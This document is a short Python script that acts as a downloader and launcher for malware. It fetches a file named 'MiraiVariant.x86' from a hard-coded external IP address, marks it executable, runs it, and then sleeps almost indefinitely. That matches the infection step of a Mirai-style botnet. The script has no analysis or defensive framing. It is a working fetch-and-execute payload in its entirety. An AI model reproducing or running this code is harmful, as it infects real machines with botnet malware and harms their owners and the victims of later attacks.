import os
import requests
import time

url = 'http://195.58.39.239/bins/MiraiVariant.x86'
filename = 'MiraiVariant.x86'

# Download the file
response = requests.get(url)
with open(filename, 'wb') as f:
    f.write(response.content)

# Set permissions on the file
os.chmod(filename, 0o755)

# Run the file with X86 argument
os.system('./MiraiVariant.x86 X86')
time.sleep(9990909099999)
